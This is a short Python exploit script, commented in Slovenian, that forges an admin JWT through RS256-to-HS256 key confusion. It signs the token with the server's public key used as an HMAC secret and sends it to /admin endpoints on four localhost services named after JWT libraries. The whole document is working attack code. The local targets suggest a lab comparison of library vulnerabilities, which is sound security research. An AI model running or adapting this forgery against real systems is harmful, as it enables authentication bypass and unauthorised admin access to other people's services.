import requests, base64, json, hmac, hashlib

def b64e(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64d(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


with open('../public.pem', 'rb') as f:
    public_key = f.read()

# Ustvarjanje ponarejenega tokena
header = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}))
payload = b64e(json.dumps({"user": "hacker", "role": "admin", "exp": 9999999999}))

msg = f"{header}.{payload}".encode()
sig = hmac.new(public_key, msg, hashlib.sha256).digest()
forged_token = f"{header}.{payload}.{b64e(sig)}"

print(f"Ponarejen token: {forged_token[:60]}...")

targets = {
    "PyJWT":        "http://localhost:5000/admin",
    "jsonwebtoken": "http://localhost:3000/admin",
    "php-jwt":      "http://localhost:8080/admin",
    "jjwt":         "http://localhost:8081/admin",
}

print("\nRS256 -> HS256 key confusion rezultati:")
for name, url in targets.items():
    try:
        r = requests.get(url, headers={'Authorization': f'Bearer {forged_token}'})
        print(f"{name}: {r.json()}")
    except Exception as e:
        print(f"{name}: ERROR - {e}")